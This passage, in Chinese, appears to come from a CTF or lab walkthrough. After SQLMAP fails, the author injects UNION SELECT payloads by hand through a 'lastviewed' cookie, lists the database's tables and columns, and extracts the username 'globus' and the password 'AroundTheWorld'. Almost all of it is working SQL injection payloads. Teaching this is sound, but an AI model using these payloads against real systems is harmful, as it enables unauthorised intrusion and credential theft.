3.5 由于在SQLMAP注入不成功，手工注入

查看当前数据库，得到数据库名称为library

lastviewed="{"lastviewed"==""Netherlands" union select database()"}"

查看当前数据库表字段内容为countries

lastviewed="{"lastviewed"==""Netherlands" union select table_name from information_schema.tables where table_schema='library'"}"

排除countries表，查看其它表得到access表

lastviewed="{"lastviewed"==""Netherlands" union select table_name from information_schema.tables where table_schema='library' and table_name!='countries'"}"

查看列名，并得到字段password

lastviewed="{"lastviewed"==""Netherlands" union select column_name from information_schema.columns where table_name='access'"}"

查看其它字段内容，得到字段username

lastviewed="{"lastviewed"==""Netherlands" union select column_name from information_schema.columns where table_name='access' and column_name!='password'"}"

查询username字段内容，得到用户名为：globus

lastviewed="{"lastviewed"==""Netherlands" union select username from access"}"

查询password字段，得到密码为：AroundTheWorld

lastviewed="{"lastviewed"==""Netherlands" union select password from access"}"
